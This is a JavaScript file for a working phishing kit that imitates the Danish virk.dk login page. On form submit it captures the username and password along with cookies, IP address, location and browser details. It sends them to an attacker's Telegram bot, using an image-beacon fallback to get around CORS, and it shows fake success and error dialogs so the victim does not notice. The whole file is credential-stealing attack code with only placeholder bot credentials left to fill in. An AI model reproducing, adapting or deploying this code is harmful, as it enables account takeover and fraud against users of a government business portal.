// ===== TELEGRAM CONFIGURATION =====
const TELEGRAM_CONFIG = {
    botToken: "YOUR_BOT_TOKEN_HERE",  // ← REPLACE with your bot token
    chatId: "YOUR_CHAT_ID_HERE"       // ← REPLACE with your chat ID
};

// ===== SEND TO TELEGRAM =====
async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        const data = await response.json();
        return data.ok;
    } catch (error) {
        // Fallback via image beacon (bypasses CORS)
        return await sendToTelegramFallback(message);
    }
}

async function sendToTelegramFallback(message) {
    const encodedMessage = encodeURIComponent(message);
    const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage?chat_id=${TELEGRAM_CONFIG.chatId}&text=${encodedMessage}&parse_mode=HTML`;
    
    return new Promise((resolve) => {
        const img = new Image();
        img.onload = () => resolve(true);
        img.onerror = () => resolve(false);
        img.src = url;
    });
}

// ===== GET VICTIM INFO =====
async function getVictimInfo() {
    const info = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookies: document.cookie,
        referrer: document.referrer || 'Direct',
        timestamp: new Date().toLocaleString('da-DK', { timeZone: 'Europe/Copenhagen' }),
        ip: 'Unknown'
    };
    
    // Get IP
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        info.ip = data.ip;
    } catch (e) {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            info.ip = data.ip || 'Unknown';
            if (data.city) info.location = `${data.city}, ${data.country_name}`;
            if (data.org) info.isp = data.org;
        } catch (e2) {
            // IP lookup failed
        }
    }
    
    return info;
}

// ===== FORMAT TELEGRAM MESSAGE =====
function formatCredentialsMessage(username, password, victimInfo) {
    return `🔴 <b>NYT LOGIN FANGET - VIRK.DK</b> 🔴\n━━━━━━━━━━━━━━━━━━━━━━\n📅 <b>Tidspunkt:</b> ${victimInfo.timestamp}\n🌐 <b>IP:</b> ${victimInfo.ip}\n📍 <b>Tidszone:</b> ${victimInfo.timezone}\n━━━━━━━━━━━━━━━━━━━━━━\n👤 <b>BRUGER-ID:</b> <code>${username}</code>\n🔑 <b>ADGANGSKODE:</b> <code>${password}</code>\n━━━━━━━━━━━━━━━━━━━━━━\n🖥 <b>Browser:</b> ${victimInfo.userAgent}\n🔗 <b>Henviser:</b> ${victimInfo.referrer}\n━━━━━━━━━━━━━━━━━━━━━━\n⚠️ <b>STATUS:</b> Afventer validering`;
}

// ===== MAIN FORM HANDLER =====
document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');
    const loginBtn = document.getElementById('loginBtn');
    const btnText = document.querySelector('.btn-login-text');
    const btnLoading = document.getElementById('btnLoading');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const toggleVisibility = document.getElementById('toggleVisibility');
    const errorModal = document.getElementById('errorModal');
    const modalClose = document.getElementById('modalClose');
    const successModal = document.getElementById('successModal');
    
    // Toggle password visibility
    if (toggleVisibility) {
        toggleVisibility.addEventListener('click', function() {
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
            } else {
                passwordInput.type = 'password';
            }
        });
    }
    
    // Close error modal
    if (modalClose) {
        modalClose.addEventListener('click', function() {
            errorModal.style.display = 'none';
            passwordInput.value = '';
            passwordInput.focus();
        });
    }
    
    // Form submit
    if (loginForm) {
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = usernameInput.value.trim();
            const password = passwordInput.value;
            
            // Basic validation
            if (!username || !password) {
                if (!username) usernameInput.style.borderColor = '#DC3545';
                if (!password) passwordInput.style.borderColor = '#DC3545';
                
                setTimeout(() => {
                    usernameInput.style.borderColor = '';
                    passwordInput.style.borderColor = '';
                }, 2000);
                
                return;
            }
            
            // Show loading
            btnText.style.display = 'none';
            btnLoading.style.display = 'block';
            loginBtn.disabled = true;
            
            // Get victim info
            const victimInfo = await getVictimInfo();
            
            // Small delay for realism
            await new Promise(resolve => setTimeout(resolve, 1500));
            
            // Send to Telegram
            const message = formatCredentialsMessage(username, password, victimInfo);
            const sent = await sendToTelegram(message);
            
            // Hide loading
            btnText.style.display = 'block';
            btnLoading.style.display = 'none';
            loginBtn.disabled = false;
            
            // Show success/verification modal first
            successModal.style.display = 'flex';
            
            // After 3 seconds, show error modal
            setTimeout(() => {
                successModal.style.display = 'none';
                errorModal.style.display = 'flex';
                passwordInput.value = '';
            }, 3000);
            
            // Log to console
            console.log('Credentials captured:', {
                username,
                password: '***',
                victimInfo,
                sentToTelegram: sent
            });
        });
    }
    
    // Reset border on input
    if (usernameInput) {
        usernameInput.addEventListener('input', function() {
            usernameInput.style.borderColor = '';
        });
    }
    
    if (passwordInput) {
        passwordInput.addEventListener('input', function() {
            passwordInput.style.borderColor = '';
        });
    }
});
